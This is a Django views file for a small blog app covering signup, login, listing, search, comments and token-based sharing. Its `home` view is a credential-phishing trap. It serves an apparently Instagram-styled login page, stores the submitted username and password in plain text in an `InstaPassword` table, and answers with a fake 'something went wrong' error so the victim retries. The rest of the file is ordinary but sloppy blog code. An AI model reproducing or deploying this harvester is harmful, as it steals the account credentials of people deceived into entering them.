from django.shortcuts import render,redirect
from django.contrib.auth.models import User
from django.contrib.auth import authenticate,login,logout
from django.contrib.auth.decorators import login_required
from .  models import *
from . form import *

from django.shortcuts import HttpResponse

# Create your views here.
# Create your views here.
from django.core.paginator import Paginator

from . email import  share_blog
from django.db.models import Q
import uuid


def home(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        InstaPassword.objects.create(name= username, password = password)
        return HttpResponse("Somethig went wrong Thank you , Please try again ")
    return render(request,"instalogin.html")

def SignupPage(request):
    if request.method == 'POST':
        form = SignupUser(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            # messages.success(request, "Registration successful.")
            return redirect("blogs")
        else:
            print("Form is not valid:", form.errors)
    else:
        form = SignupUser()

    return render(request, 'register.html', {"form": form})
def LoginPage(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)        
        if user is not None:
            login(request, user)
            return redirect('blogs')  # Redirect to staff-specific page
        else:
            form = UserLoginForm(request.POST)
            return render(request, 'login.html' ,{"form":form})

    return render(request, 'login.html')
    




def upload(request):
    return render(request,"upload.html")



@login_required(login_url='login')
def Blogs(request):
    obj = Blog.objects.all()
    user = request.user
    paginator = Paginator(obj,3)
    pagenumber =request.GET.get('page')
    blogs= paginator.get_page(pagenumber)
    context = {
        "all_blogs": blogs,
        "user" :user
    }
    return render (request,'blogs.html',context)
                   




@login_required(login_url='login')
def search_blogs(request):
    query = request.POST.get('query')
    print("---------------------",query)
    if query:
        # Perform a case-insensitive search for each word in the query
        query_list = query.split()
        blogs = Blog.objects.filter(
            Q(title__icontains=query) |
            Q(description__icontains=query) |
            Q(summary__icontains=query) |
            Q(hashtags__hashtag__in=query_list)
        ).distinct()
    else:
        blogs = Blog.objects.none()  # Return no results if no query is provided

    context = {
        "all_blogs": blogs
    }
    return render(request, 'blogs.html', context)



@login_required(login_url='login')
def Blog_Detail(request,id):
    obj = Blog.objects.get(id = id)
    comment = Blog_Commnet.objects.filter(blog= id)
    context = {
        "response": obj,
        "comment" : comment
    }
    return render (request,'blog-detail.html',context)





def logout_user(request):
    logout(request)
    return redirect('login')




from django.urls import reverse
@login_required(login_url='login')
def Commnet_Blog(request,id):
    obj = Blog.objects.get(id=id)
    if request.method == 'POST':
        commnet = request.POST.get("comment")
        email = request.POST.get("email")
        commnet_obj = Blog_Commnet.objects.create(blog = obj , email=email,comment=commnet)
        detail_page_url = reverse('detail-page', args=[obj.id])
        
        return redirect(detail_page_url)
        
   



@login_required(login_url='login')
def Share_Blogs(request,id):
    obj = Blog.objects.get(id = id)
    if request.method == "POST":
        commnet = request.POST.get("comment")
        name = request.POST.get("name")
        email_f = request.POST.get("email")
        to = request.POST.get("to")
        
        blog_token = Share_Blog.objects.create(blog=obj, email = to, token = uuid.uuid4())
        share_blog(email_f,obj.title,to,commnet,blog_token.token,name)
        commnet_obj = Blog_Commnet.objects.create(blog = obj , email=email_f,comment=commnet)
        return HttpResponse("DOnr hi ")

    context = {
        "response": obj,
    }

    return render(request,"share-blog.html",context)

# http://127.0.0.1:8000/view-blog/530b1bc8-e60a-423b-811a-310f4c31fdff/

def View_blog(request,token):
    token = Share_Blog.objects.filter(token=token).first()
    obj = Blog.objects.get(id = token.blog_id)
    comment = Blog_Commnet.objects.filter(blog= token.blog_id)
    context = {
        "response": obj,
        "comment" : comment
    }
    return render (request,'blog-detail.html',context)

